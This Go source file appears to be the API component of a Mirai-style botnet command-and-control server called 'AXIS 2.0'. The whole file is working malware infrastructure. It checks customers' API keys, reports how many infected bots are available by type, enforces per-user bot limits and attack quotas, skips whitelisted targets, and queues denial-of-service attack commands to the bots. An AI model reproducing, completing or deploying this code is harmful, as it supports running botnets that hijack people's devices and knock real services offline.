package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

type Api struct {
	conn net.Conn
}

func NewApi(conn net.Conn) *Api {
	return &Api{conn}
}

func (this *Api) Handle() {
	var botCount int
	var apiKeyValid bool
	var userInfo AccountInfo

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("AXIS 2.0 API Server - Enter API Key|command\r\n"))
	cmd, err := this.ReadLine()
	if err != nil {
		this.conn.Write([]byte("ERR|Failed reading line\r\n"))
		return
	}

	passwordSplit := strings.SplitN(cmd, "|", 2)
	if len(passwordSplit) < 2 {
		this.conn.Write([]byte("ERR|Invalid format. Use: APIKEY|command\r\n"))
		return
	}

	if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
		this.conn.Write([]byte("ERR|API code invalid\r\n"))
		return
	}

	cmd = passwordSplit[1]

	if cmd == "amountbots" {
		botCount = clientList.Count()
		m := clientList.Distribution()
		for k, v := range m {
			this.conn.Write([]byte(fmt.Sprintf("%s: %d\r\n", k, v)))
		}
		this.conn.Write([]byte(fmt.Sprintf("Total bot count: %d\r\n", botCount)))
		return
	}

	if cmd[0] == '-' {
		countSplit := strings.SplitN(cmd, " ", 2)
		count := countSplit[0][1:]
		botCount, err = strconv.Atoi(count)
		if err != nil {
			this.conn.Write([]byte("ERR|Failed parsing botcount\r\n"))
			return
		}
		if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
			this.conn.Write([]byte("ERR|Specified bot count over limit\r\n"))
			return
		}
		cmd = countSplit[1]
	} else {
		botCount = userInfo.maxBots
	}

	atk, err := NewAttack(cmd, userInfo.admin)
	if err != nil {
		this.conn.Write([]byte("ERR|Failed parsing attack command\r\n"))
		return
	}
	buf, err := atk.Build()
	if err != nil {
		this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
		return
	}
	if database.ContainsWhitelistedTargets(atk) {
		this.conn.Write([]byte("ERR|Attack targeting whitelisted target\r\n"))
		return
	}
	if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
		this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
		return
	}

	clientList.QueueBuf(buf, botCount, "")
	this.conn.Write([]byte("OK|Attack launched\r\n"))
}

func (this *Api) ReadLine() (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			return string(buf[:bufPos]), nil
		}
		bufPos++
	}
}
